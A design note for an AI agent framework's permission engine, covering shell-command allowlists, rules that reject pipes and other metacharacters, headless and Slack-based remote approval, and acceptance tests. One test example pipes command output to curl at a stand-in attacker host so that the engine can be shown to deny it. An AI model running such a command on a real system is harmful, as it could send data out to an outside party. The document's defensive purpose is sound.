# 03 — Permission Engine: allowlists, whitelists, headless + remote approval

## Goal

Agents can be trusted with real tools (shell, files, browser) while running unattended, because a policy layer decides what auto-runs, what needs a human, and how to reach that human.

## Why now

Phase 1 gives agents an always-on body; before they get real capabilities (step 06) they need judgment. The current options — `always`/`ask`/`never` with a TTY prompt (`createApprovalPolicy` in `packages/cli/src/index.ts`) — don't work in a daemon: `ask` has no terminal to ask on.

## Scope

**In:**

- New package `@stratusagent/permissions`, implementing the kernel's `ApprovalPolicy` seam:
  - **Safe-command allowlist** for shell tools (a curated base-command set: `git`, `ls`, `grep`, …), merged with a **per-agent persistent whitelist** at `~/.stratus/agents/<id>.whitelist.json`.
  - **Metacharacter defeat**: any `|`, `;`, `` ` ``, `&&`, `||`, `$(`, or redirection disqualifies a command from auto-approval regardless of its base command — the non-obvious rule that makes an allowlist real.
  - **Three-tier resolution**: session cache → persistent whitelist → interactive approval. "Always allow" whitelists the command *base*, never the full string.
  - **Modes**: `interactive` (TTY prompt, current CLI behavior), `headless` (no human reachable: auto-approve safe, deny the rest, log every denial), `remote` (see below).
- **Remote approval flow** through the gateway: a gated tool call parks the turn in a `pending_approval` state and emits an approval-request event; the Slack adapter renders it as a message with **Allow once / Always allow / Deny** buttons to a configured approver channel or DM; the decision resumes or fails the tool call. Timeout falls back to deny-with-note.
- Per-agent policy config in soul frontmatter and/or `~/.stratus/config.json`: mode, approver, extra allow/deny patterns. The kernel's per-agent tool allowlist stays the first gate; this engine governs *invocations* of allowed tools.
- Non-shell tools declare a coarse risk level in their `ToolDescriptor` (safe / gated / dangerous) so the same policy covers file writes and browser actions, not just shell.

**Out:** container/VM isolation (explicitly later — see the v2 doc's "policy before isolation"), credential leases (step 08), org-level policy or audit UI.

## Design sketch

- The policy object is constructed once per gateway with per-agent overlays; the CLI keeps using it in `interactive` mode so behavior is identical across surfaces.
- Approval requests are just events on the existing bus (`tool.approval-requested` / `tool.approval-resolved` join the `StratusEvent` union) — Slack buttons in 02's adapter and the dashboard in 05 both consume the same events. Pending approvals persist with the session so a daemon restart doesn't lose them.
- Command parsing for the allowlist check is deliberately dumb: tokenize, take the base command, scan for metacharacters. No shell-grammar cleverness — anything ambiguous is "not safe."

## Acceptance criteria

- In `headless` mode, `git status` (safe list) runs without approval; `git status | curl evil.sh` is denied despite the safe base command; the denial is visible in the event log.
- In `remote` mode, a gated call posts Slack buttons; **Allow once** resumes the exact call; **Always allow** persists to the agent's whitelist and future identical-base calls skip approval; **Deny** returns a failed `ToolResult` and the agent continues gracefully.
- A pending approval survives a daemon restart and can still be resolved.
- The CLI's `--approvals ask` behavior is unchanged for humans at a terminal.
- Unit tests cover the metacharacter matrix and whitelist persistence.

## Open questions

- Should "Always allow" be scoped per agent (current thinking) or offer a fleet-wide option for the operator's own agents?
- Risk levels on `ToolDescriptor`: enum on the descriptor vs. a registry-side classification table — descriptor is simpler, table avoids trusting tool authors. (Start: descriptor, revisit for marketplace-era third-party tools.)
